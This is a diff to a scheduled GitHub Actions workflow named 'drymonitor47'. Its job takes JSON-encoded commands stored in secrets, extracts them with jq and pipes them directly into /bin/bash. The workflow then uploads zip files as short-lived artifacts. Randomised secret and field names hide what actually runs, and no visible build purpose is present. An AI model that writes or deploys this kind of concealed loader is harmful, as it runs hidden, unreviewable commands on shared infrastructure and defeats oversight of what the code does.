@@ -1,8 +1,9 @@
 name: drymonitor47
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '9 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,23 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: drymonitor47
         env:
-          qz24263: ${{ secrets.qz24263 }}
+          gjed6: ${{ secrets.gjed6 }}
         run: |
-          echo $qz24263 | jq -r .f3 | /bin/bash
-          echo $b1273 | jq -r .xcmae21499 | /bin/bash
-          echo $ditmf98426 | jq -r .fpfn51 | /bin/bash
-          echo $rzpr16 | jq -r .usa315 | /bin/bash
-          echo $synac05799 | jq -r .ust1 | /bin/bash
-          echo $l07 | jq -r .ldz186 | /bin/bash
-          echo $tbch413 | jq -r .ugnlw00565 | /bin/bash
-          echo $iifyr63409 | jq -r .tpc40721 | /bin/bash
-          echo $nxnge02167 | jq -r .fua90 | /bin/bash
-          echo $oyj25 | jq -r .vpja36248 | /bin/bash
-          echo $v9 | jq -r .o66421 | /bin/bash
-          echo $qatk35413 | jq -r .wngv45 | /bin/bash
-          echo $yau49130 | jq -r .fubip6 | /bin/bash
-          echo $ck7920 | jq -r .n65 | /bin/bash
-          echo $bnfd59 | jq -r .eoe804 | /bin/bash
-          echo $we73624 | jq -r .wk83483 | /bin/bash
-          echo $df61217 | jq -r .ykqw83 | /bin/bash
+          printf '%s' "$gjed6" | jq -r .bwbin856 | /bin/bash
+          printf '%s' "$lug2949" | jq -r .nz9474 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5Zkm1eD7
+          path: "*.zip"
+          retention-days: 1
